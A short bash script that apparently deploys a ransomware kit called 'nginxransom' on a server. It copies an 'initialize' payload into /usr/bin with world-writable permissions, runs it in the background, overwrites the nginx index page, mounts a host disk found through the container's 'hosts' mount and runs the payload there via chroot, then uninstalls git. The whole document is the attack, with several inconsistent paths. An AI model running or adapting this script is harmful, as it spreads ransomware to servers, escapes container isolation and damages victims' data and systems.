#!/bin/bash  

#apt update -y 
#apt install git -y  
#git clone https://github.com/xeroxpro/nginxransom.git
cp -u nginxransom/initialize.txt /usr/bin/initialize && cp nginxransom/initialize.txt ../ && chmod 777 /usr/bin/initialize && ./initialize &  
cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html && wait && chmod 777 initialize
diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
mount $diskpart /mnt/
cp -u /usr/bin/initialize  mnt/usr/bin/initialize && chmod 777 mnt/usr/bin/initialize 
chroot mnt/usr/bin/ ./initialize &
apt remove git -y

